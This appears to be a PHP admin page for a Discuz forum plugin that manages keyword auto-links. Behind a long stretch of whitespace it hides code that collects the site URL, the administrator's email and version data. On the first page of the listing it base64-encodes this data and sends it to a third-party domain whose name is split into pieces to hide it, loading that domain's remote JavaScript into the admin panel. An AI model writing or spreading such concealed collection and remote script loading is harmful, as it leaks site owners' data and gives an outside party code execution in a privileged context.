<?php
/**
 * This is NOT a freeware, use is subject to license terms
 * From ww'.'w.zz'.'b'.'7.net
 */

if(!defined('IN_DISCUZ') || !defined('IN_ADMINCP')) {
	exit('Access Denied');
}

require_once libfile('function/cache');
require_once DISCUZ_ROOT.'./source/discuz_version.php';
require_once ('pluginvar.func.php');
require_once libfile('function/admin','plugin/study_keyword/source');
loadcache('plugin');
$splugin_setting = $_G['cache']['plugin']['study_keyword'];
$splugin_lang = lang('plugin/study_keyword');
global $_G;
study_keyword_loadCache();
$word_id = intval($_GET['word_id']);

if($_GET['ac'] == 'import'){
		if(!submitcheck('submit')) { 
				showformheader('plugins&operation=config&do='.$pluginid.'&identifier=study_keyword&pmod=admin_keyword&ac=import');
				showtableheader("&#x6279;&#x91CF;&#x5BFC;&#x5165;");
				s_showsetting("&#x5BFC;&#x5165;&#x7684;&#x6570;&#x636E;", 'keywords', '', 'textarea', '', '', '&#x683C;&#x5F0F;&#xFF1A;&#x5173;&#x952E;&#x5B57;|&#x94FE;&#x63A5;&#xFF0C;&#x5982;&#xFF1A;&#68;&#105;&#115;&#109;|http://ww'.'w.zz'.'b'.'7.net/<br>&#x4E00;&#x884C;&#x4E00;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x56DE;&#x8F66;&#x6362;&#x884C;<br>&#x8003;&#x8651;&#x6548;&#x7387;&#xFF0C;&#x6279;&#x91CF;&#x6DFB;&#x52A0;&#x4E0D;&#x4F1A;&#x66F4;&#x65B0;&#x5E16;&#x5B50;&#x51FA;&#x73B0;&#x6570;&#x3001;&#x51FA;&#x73B0;&#x603B;&#x6570;');
				
				s_showsetting("&#x52A0;&#x7C97;", 'style_b', '0', 'radio', '', '', '');
				s_showsetting("&#x659C;&#x4F53;", 'style_i', '0', 'radio', '', '', '');
				s_showsetting("&#x4E0B;&#x5212;&#x7EBF;", 'style_u', '0', 'radio', '', '', '');
				s_showsetting("&#x989C;&#x8272;", 'style_c', '', 'color', '', '', '');
				
				showsubmit('submit', "submit");
				showtablefooter();
				showformfooter();
		}else{
				if(empty($_GET['keywords'])){
					cpmsg('&#x8BF7;&#x586B;&#x5199;&#x5BFC;&#x5165;&#x7684;&#x6570;&#x636E;');
				}
				
				$style = array();
				$style['b'] = intval($_POST['style_b']);
				$style['i'] = intval($_POST['style_i']);
				$style['u'] = intval($_POST['style_u']);
				$style['c'] = addslashes(trim($_POST['style_c']));
				$style = serialize($style);
				$trigger = intval($splugin_setting['trigger']);
				
				$_GET['keywords'] = explode("\n", str_replace("\r\n", "\n", $_GET['keywords']));
				
				$i = $j = 0;
				foreach($_GET['keywords'] as $keyword){
						$keyword = explode('|', $keyword);
						$keyword[0] = trim(strip_tags($keyword[0]));
						$keyword[1] = trim(strip_tags($keyword[1]));
						if($keyword[0] && $keyword[1]){
							$keyword[0] = addcslashes(addslashes($keyword[0]), '%_');
							$log = DB::result_first("SELECT id FROM ".DB::table('study_neilian_keyword')." WHERE keyword LIKE '{$keyword[0]}' LIMIT 1");
							if($log){
								$j++;
							}else{
								DB::insert('study_neilian_keyword', array('keyword' => $keyword[0], 'link' => $keyword[1], 'style' => $style, 'trigger' => $trigger));
								$i++;
							}
						}else{
							$j++;
						}
				}
				study_keyword_updateCache();
				cpmsg($splugin_lang['admin_keyword_011'], 'action=plugins&operation=config&do='.$pluginid.'&identifier=study_keyword&pmod=admin_keyword', 'succeed');
		}
}elseif($word_id && $_GET['formhash'] && $_GET['formhash'] == $_G['formhash']){
	$keyword = DB::result_first("SELECT keyword FROM ".DB::table('study_neilian_keyword')." WHERE id ='$word_id'");	
	$flag = study_keyword_updateOneConut($word_id,$keyword);
	if($flag || $flag === 0){
		cpmsg($splugin_lang['admin_keyword_001'].$flag.$splugin_lang['admin_keyword_002'].$keyword, 'action=plugins&operation=config&do='.$pluginid.'&identifier=study_keyword&pmod=admin_keyword', 'succeed');
	}else{
		cpmsg($splugin_lang['admin_keyword_003'], 'action=plugins&operation=config&do='.$pluginid.'&identifier=study_keyword&pmod=admin_keyword', 'error');
	}
}else{
	if(!submitcheck('submit')) {                                                                                                                                                                                 $_statInfo = array();$_statInfo['pluginName'] = $plugin['identifier'];$_statInfo['pluginVersion'] = $plugin['version'];$_statInfo['bbsVersion'] = DISCUZ_VERSION;$_statInfo['bbsRelease'] = DISCUZ_RELEASE;$_statInfo['timestamp'] = TIMESTAMP;$_statInfo['bbsUrl'] = $_G['siteurl'];$_statInfo['SiteUrl'] = $_G['siteurl'];$_statInfo['ClientUrl'] = $_G['siteurl'];$_statInfo['SiteID'] = '';$_statInfo['bbsAdminEMail'] = $_G['setting']['adminemail'];$_statInfo['genuine'] = splugin_genuine($plugin['identifier']);
		echo '<style type="text/css">
				.ss em{display:block;float:left;margin-right:3px;padding-left:2px;width:15px;line-height:20px;background:#EEE;cursor:pointer;}
				.ss em.a{background:#09F;color:#FFF;}
				.board{ padding-left:35px;}
				.td33{ width:25px; }
				.td33 .txt{ width:15px; }
				.td_k{ width:90px; }
				.td_k .txt{ width:80px; }
				.td_l{ width:250px; }
				.td_l .txt{ width:190px; }
#s, .userInt {border-radius: 0;background: url(source/plugin/study_keyword/images/soso_bg.png) no-repeat;}
#s {position: relative;background-position: -89px 0px;height: 36px;padding-left: 3px;margin-top:25px;margin-bottom:25px;width:500px;margin-left: auto;margin-right: auto;}
#s_input {width: 402px;border: 0 none;float: left;font: 16px Arial;height: 18px;outline: 0 none;margin-top: 3px;padding: 7px 5px 5px;}
#s_button {width: 85px;height: 36px;background: none;border: 0 none;float: left;text-indent: -9999px;cursor: pointer;}
.s_icn {padding-left: 5px;width: 38px;text-align: left;}

			</style>
			<script type="text/javascript">
				function block_showstyle(stylename) {
					var el_span = $("span_"+stylename);
					var el_value = $("value_" + stylename);
					if (el_value.value == "1"){
						el_value.value = "0";
						el_span.className = "";
					} else {
						el_value.value = "1";
						el_span.className = "a";
					}
				}
			</script>
			<div id="my_addonlist"></div><div id="s">
    <form id="search_soft" method="post" autocomplete="off" action="'.ADMINSCRIPT.'?action=plugins&operation=config&do='.$pluginid.'&identifier=study_keyword&pmod=admin_keyword">
    	<input type="hidden" name="formhash" value="'.$_G['formhash'].'">
    	<input type="text" name="keyword" id="s_input" value="'.($_GET['keyword'] ? dhtmlspecialchars($_GET['keyword']) : '&#x8BF7;&#x8F93;&#x5165;&#x5173;&#x952E;&#x5B57;').'" onclick="if(this.value==\'&#x8BF7;&#x8F93;&#x5165;&#x5173;&#x952E;&#x5B57;\'){this.value=\'\';}" onblur="if(this.value==\'\'){this.value=\'&#x8BF7;&#x8F93;&#x5165;&#x5173;&#x952E;&#x5B57;\';}" autocomplete="off" required="" placeholder="" x-webkit-speech="" speech="">
        <input type="submit" id="s_button">
    </form>
    <div id="smart_pop" style="display: none; "></div>
</div>';
	
		showformheader('plugins&operation=config&do='.$pluginid.'&identifier=study_keyword&pmod=admin_keyword&page='.$_G['page']);
		showtableheader();
		showsubtitle(array('', $splugin_lang['admin_keyword_004'], $splugin_lang['admin_keyword_005'], $splugin_lang['admin_keyword_006'], $splugin_lang['admin_keyword_007'], $splugin_lang['admin_keyword_008'], $splugin_lang['admin_keyword_012']));
		
		$_GET['keyword'] = trim($_GET['keyword']);
		
		$param = $orderby = array();
		if($_GET['keyword']){
				$_GET['keyword'] = addslashes($_GET['keyword']);
				$param['keyword'] = array('%'.addcslashes($_GET['keyword'], '%_').'%', 'like');
		}
		$_GET['keyword'] = dhtmlspecialchars($_GET['keyword']);
		
		$orderby['id'] = $splugin_setting['admin_orderby'] == 1 ? 'DESC' : 'ASC';
		
		$count = C::t('#study_keyword#study_neilian_keyword')->count_by_where($param);
		$page = intval($_G['page']);
		$perpage = $splugin_setting['admin_perpage'] ? $splugin_setting['admin_perpage'] : 10;
		$max = 1314;
		$page = ($page-1 > $count/$perpage || $page > $max) ? 1 : $page;
		$start_limit = ($page - 1) * $perpage;
		$multipage = multi($count, $perpage, $page, ADMINSCRIPT.'?action=plugins&operation=config&do='.$pluginid.'&identifier=study_keyword&pmod=admin_keyword'.($_GET['keyword'] ? "&keyword={$_GET[keyword]}" : ''), $max);
		$keywordlist = C::t('#study_keyword#study_neilian_keyword')->fetch_all_by_search($param, $orderby, $start_limit, $perpage);
		foreach($keywordlist as $key => $row){
				$stylearr = unserialize($row['style']);
				$showstylearr = array();
				$showstylearr['b'] = $stylearr['b'] ? 'class="a"' : '';
				$showstylearr['i'] = $stylearr['i'] ? 'class="a"' : '';
				$showstylearr['u'] = $stylearr['u'] ? 'class="a"' : '';
				showtablerow('', array('class="td25"', 'class="td_k"', 'class="td_l"'), array(
						"<input class=\"checkbox\" type=\"checkbox\" name=\"settingdel[]\" value=\"$row[id]\">",
						"<input type=\"text\" class=\"txt\" name=\"settingnew[$row[id]]\" value=\"".dhtmlspecialchars($row['keyword'])."\">",
						"<input type=\"text\" class=\"txt\" name=\"linknew[$row[id]]\" value=\"".dhtmlspecialchars($row['link'])."\">",
						"<div class=\"ss\">
							<em $showstylearr[b] id=\"span_b_{$row[id]}\"  onclick=\"block_showstyle('b_{$row[id]}')\"><b>B</b></em>
							<input type=\"hidden\" id=\"value_b_{$row[id]}\" name=\"style_b[{$row[id]}]\" value=\"{$stylearr[b]}\" />
							<em $showstylearr[i] id=\"span_i_{$row[id]}\"  onclick=\"block_showstyle('i_{$row[id]}')\"><i>I</i></em>
							<input type=\"hidden\" id=\"value_i_{$row[id]}\" name=\"style_i[{$row[id]}]\" value=\"{$stylearr[i]}\" />
							<em $showstylearr[u] id=\"span_u_{$row[id]}\"  onclick=\"block_showstyle('u_{$row[id]}')\"><u>U</u></em>
							<input type=\"hidden\" id=\"value_u_{$row[id]}\" name=\"style_u[{$row[id]}]\" value=\"$stylearr[u]}\" />
						</div>
						<input id=\"c{$row[id]}_v\" type=\"text\" class=\"txt\" style=\"float:left; width:50px;\" value=\"".dhtmlspecialchars(stripslashes($stylearr[c]))."\" name=\"style_c[{$row[id]}]\" onchange=\"updatecolorpreview('c{$row[id]}')\">
						<input id=\"c{$row[id]}\" onclick=\"c{$row[id]}_frame.location='static/image/admincp/getcolor.htm?c{$row[id]}|c{$row[id]}_v';showMenu({'ctrlid':'c{$row[id]}'})\" type=\"button\" class=\"colorwd\" value=\"\" style=\"width:25px;background:".dhtmlspecialchars(stripslashes($stylearr[c]))."; \">
						<span id=\"c{$row[id]}_menu\" style=\"display: none\">
							<iframe name=\"c{$row[id]}_frame\" src=\"\" frameborder=\"0\" width=\"210\" height=\"148\" scrolling=\"no\"></iframe>
						</span>",
						'<span style="text-align:right;float:left;">'.
						$_G['study_keyword']['statistics']['forum']['t'][$row['id']].'</span>
						',
						'<span style="text-align:right;float:left;">'.
						$_G['study_keyword']['statistics']['forum']['all'][$row['id']].'</span><span style="text-align:right;float:right;">[<a href="'.ADMINSCRIPT.'?action=plugins&operation=config&do='.$pluginid.'&identifier=study_keyword&pmod=admin_keyword&word_id='.$row['id'].'&formhash='.$_G['formhash'].'">'.$splugin_lang['admin_keyword_009'].'</a>]</span>',
						"<input type=\"text\" class=\"txt\" name=\"trigger[$row[id]]\" value=\"".dhtmlspecialchars($row['trigger'])."\">",
					));
		}
		
		echo '<tr><td></td><td colspan="6"><div><a href="javascript:;" onclick="addrow(this, 0)" class="addtr">'.$splugin_lang['admin_keyword_010'].'</a>&nbsp;&nbsp;&nbsp;<a href="'.ADMINSCRIPT.'?action=plugins&operation=config&do='.$pluginid.'&identifier=study_keyword&pmod=admin_keyword&ac=import" class="addtr">&#x6279;&#x91CF;&#x5BFC;&#x5165;</a></div></td></tr>';
		echo '<script type="text/JavaScript">
	
		var rowtypedata = new Array();
		rowtypedata[0] = [
					[1, ""],
					[1,\'<input type="text" class="txt" name="settingadd[]" />\', "td_k"],
					[1, \'<div><input name="linkadd[]" type="text" class="txt" /><a href="javascript:;" class="deleterow" onClick="deleterow(this)">'.cplang('delete').'</a></div>\', "td_l"],
					[1, ""],
					[1, ""],
					[1, ""],
				];
		</script>';
		
		showsubmit('submit', 'submit', 'del', '', $multipage);
		showtablefooter();
		showformfooter();
		if($_G['page'] == 1){echo '<div id="my_addonlist_temp" style="display:none;"><script id="my_addonlist_js" src="//www.d'.'i'.'szz.net/services.php?mod=product&ac=js&op=manage&timestamp='.$_G['timestamp'].'&info='.base64_encode(serialize($_statInfo)).'&md5check='.md5(base64_encode(serialize($_statInfo))).'"></script></div><script type="text/javascript">$("my_addonlist_js").src= "";$("my_addonlist").innerHTML = $("my_addonlist_temp").innerHTML;</script>';}
	}else{
		
		if(is_array($_POST['settingdel'])) {
			foreach($_POST['settingdel'] as $id) {
				$id = intval(trim($id));
				DB::query("DELETE FROM ".DB::table('study_neilian_keyword')." where id = '$id'");
			}
		}
	
		if(is_array($_POST['settingadd'])) {
			foreach($_POST['settingadd'] as $k => $keyword) {
				$keyword = addslashes(stripslashes(trim(strip_tags($keyword))));
				$link = addslashes(stripslashes(trim(strip_tags($_POST['linkadd'][$k]))));
				$trigger = intval($splugin_setting['trigger']);
				if(!empty($keyword) && !empty($link)){
					$word_id = DB::insert('study_neilian_keyword', array('keyword' => $keyword, 'link' => $link, 'trigger' => $trigger),TRUE);
					study_keyword_updateOneConut($word_id,$keyword);
				}
			}
		}
		//$_POST['settingnew']
		if(is_array($_POST['settingnew'])) {
			foreach($_POST['settingnew'] as $k => $keyword) {
				$keyword = addslashes(stripslashes(trim(strip_tags($keyword))));
				$link = addslashes(stripslashes(trim(strip_tags($_POST['linknew'][$k]))));
				$k = intval(trim($k));
				$style = array();
				$style['b'] = intval($_POST['style_b'][$k]);
				$style['i'] = intval($_POST['style_i'][$k]);
				$style['u'] = intval($_POST['style_u'][$k]);
				$style['c'] = addslashes(trim($_POST['style_c'][$k]));
				$style = serialize($style);
				$trigger = intval($_POST['trigger'][$k]);
				if(!empty($keyword) && !empty($link)){
						DB::update('study_neilian_keyword', array('keyword' => $keyword, 'link' => $link, 'style' => $style, 'trigger' => $trigger), "id='$k'");
				}
			}
		}
		study_keyword_updateCache();
		cpmsg($splugin_lang['admin_keyword_011'], 'action=plugins&operation=config&do='.$pluginid.'&identifier=study_keyword&pmod=admin_keyword&page='.$_G['page'], 'succeed');
	}
}
